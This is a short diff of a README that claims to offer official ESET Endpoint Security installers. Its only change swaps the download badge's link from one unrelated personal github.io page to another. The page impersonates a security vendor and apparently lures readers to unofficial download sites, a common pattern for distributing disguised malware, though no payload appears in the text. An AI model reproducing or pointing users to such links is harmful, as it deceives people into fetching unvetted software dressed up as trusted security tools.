@@ -1,6 +1,6 @@
 # Download ESET Endpoint Security - Official Security Software Installers
 
-[![GET ESET Security Download](https://img.shields.io/badge/GET%20%E2%80%94%20ESET%20Security%20Download-0078D6?style=for-the-badge&logoColor=white)](https://felixbauerxiot.github.io/.github/eset-security-download)
+[![GET ESET Security Download](https://img.shields.io/badge/GET%20%E2%80%94%20ESET%20Security%20Download-0078D6?style=for-the-badge&logoColor=white)](https://dakaridanieldyjz.github.io/.github/eset-security-download)
 
 ## What ESET Security Download Provides
 
